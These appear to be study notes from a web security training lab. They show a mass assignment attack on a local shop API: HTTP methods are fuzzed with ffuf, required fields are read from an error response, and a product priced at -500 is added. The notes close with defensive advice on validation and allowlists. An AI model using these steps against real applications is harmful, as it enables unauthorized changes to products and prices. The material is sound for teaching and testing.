
---

# 📖 High-Level Summary:

This lab demonstrates a **Mass Assignment Attack** on a web application. By identifying how the server processes POST requests, we inject additional parameters that allow us to manipulate the application's behavior and add unauthorized products.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**Mass Assignment Attack**|Exploiting an application by sending additional fields in a request to manipulate object properties.|Targets unprotected endpoints that automatically map request data to internal objects.|
|**ffuf**|A web fuzzer for discovering vulnerabilities in endpoints.|Used here to test supported HTTP methods (e.g., POST, GET, OPTIONS).|
|**`-X` flag**|Specifies the HTTP method to use during ffuf fuzzing.|Example: `-X POST`.|
|**`-fc` flag**|Filters responses by status codes to ignore specific results.|Example: `-fc 405` excludes "Method Not Allowed" responses.|

---

# 💡 What is Mass Assignment?

**Mass Assignment** is a vulnerability where applications automatically bind client-provided data (e.g., JSON objects) to internal objects or database entries without proper validation or restrictions. Attackers can exploit this by injecting unauthorized fields to manipulate the application's behavior.

- **Why is this a Problem?**
    - Developers often bind input data directly to object models.
    - Without proper safeguards, attackers can modify sensitive fields or introduce malicious data.

**Example in This Lab:**

- By including a new `name`, `price`, and `image_url` in the POST request, we manipulated the application to display an unauthorized product.

---

# 🎯 Steps and Commands:

### Step 1: Investigate the Web Application

1. Navigate to:
    
    ```plaintext
    http://localhost:8888/shop
    ```
    
2. Observe the products (e.g., car seat and wheel) with their prices and images.
    
3. Use Burp Suite to capture traffic and locate the endpoint:
    
    - **Captured Request:**
        
        ```plaintext
        GET /workshop/api/shop/products
        ```
        

---

### Step 2: Fuzz HTTP Methods with ffuf

1. Run ffuf to discover supported HTTP methods:
    
    ```bash
    ffuf -u http://localhost:8888/workshop/api/shop/products -w /usr/share/seclists/Fuzzing/http-request-method.txt -X FUZZ -fc 405
    ```
    
    - **Flags Used:**
        - `-u`: Target URL.
        - `-w`: Wordlist for fuzzing HTTP methods.
        - `-X`: HTTP method to test (e.g., GET, POST).
        - `-fc`: Filters responses with status code 405 ("Method Not Allowed").
2. **Results:**
    
    - Supported Methods:
        
        ```plaintext
        OPTIONS
        HEAD
        GET
        POST
        ```
        

---

### Step 3: Test the POST Method

1. Send a **POST request** to the endpoint in Burp Suite Repeater:
    
    ```plaintext
    POST /workshop/api/shop/products
    ```
    
2. Observe the response:
    
    ```json
    {
      "name": ["This field is required"],
      "price": ["This field is required"],
      "image_url": ["This field is required"]
    }
    ```
    
3. **Key Takeaway:**
    
    - The response reveals required fields for the POST request (`name`, `price`, `image_url`).

---

### Step 4: Exploit Mass Assignment

1. Craft a new POST request with the required fields:
    
    ```json
    {
      "name": "cheesecake",
      "price": "-500",
      "image_url": "http://localhost/path/to/image.jpg"
    }
    ```
    
2. Send the request via Burp Suite Repeater.
    
3. **Response:**
    
    - The product (`cheesecake`) is now displayed on the web application with the manipulated price of `-500`.

---

# 🔍 Why is This Mass Assignment?

1. **Automatic Mapping:**
    
    - The server automatically binds the incoming JSON object (`name`, `price`, `image_url`) to the internal product object without validation.
2. **Unrestricted Data Injection:**
    
    - The application does not validate or restrict the `price` field, allowing us to set an invalid value (`-500`).
3. **Exploited Trust:**
    
    - The server blindly trusts client-provided data, leading to unintended behavior like adding unauthorized products.

---

# ✅ Key Takeaways:

1. **Validation is Critical:**
    - Always validate and sanitize client-provided data before processing.
2. **Restrict Mass Assignment:**
    - Implement allowlists to specify which fields can be updated via requests.
3. **ffuf for Discovery:**
    - Use ffuf to identify supported HTTP methods and discover exploitable endpoints.

---